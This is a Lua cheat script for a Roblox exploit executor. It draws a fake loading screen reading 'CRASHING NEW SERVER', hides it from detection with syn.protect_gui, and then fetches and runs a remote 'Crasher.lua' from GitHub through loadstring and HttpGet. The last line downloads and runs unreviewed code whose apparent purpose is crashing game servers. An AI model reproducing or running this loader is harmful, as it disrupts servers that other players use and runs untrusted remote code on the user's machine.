local function tween(...)
    game:GetService("TweenService"):Create(...):Play()
end

game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
local loading = Instance.new("ScreenGui")
local background = Instance.new("Frame")
local gradient = Instance.new("UIGradient")
local status = Instance.new("TextLabel")

loading.Name = "loading"
loading.Parent = game:GetService("CoreGui")
loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

background.Name = "background"
background.Parent = loading
background.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
background.Position = UDim2.new(0, 0, -0.100000001, 0)
background.Size = UDim2.new(1, 0, 1.10000002, 0)

gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(76, 76, 76))}
gradient.Rotation = 90
gradient.Name = "gradient"
gradient.Parent = background

status.Name = "status"
status.Parent = loading
status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
status.BackgroundTransparency = 1.000
status.Position = UDim2.new(0, 0, 0.893442631, 0)
status.Size = UDim2.new(1, 0, 0.0355480109, 0)
status.Font = Enum.Font.SourceSansItalic
status.Text = "< Crashing failed, please leave and join a new server. >"
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.TextScaled = true
status.TextSize = 14.000
status.TextStrokeColor3 = Color3.fromRGB(52, 52, 52)
status.TextStrokeTransparency = 0.000
status.TextWrapped = true
if syn then syn.protect_gui(loading) end

repeat wait() until game:GetService("Players").LocalPlayer
status.Text = "< CRASHING NEW SERVER >"

if not game:IsLoaded() then
    game.Loaded:wait()
end

wait(.66)

tween(background, TweenInfo.new(.55), {BackgroundTransparency = 1})
tween(status, TweenInfo.new(.55), {TextTransparency = 1, TextStrokeTransparency = 1})
wait(.55)
loading:Destroy()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vin2453/RIP_CH/main/Crasher.lua", true))()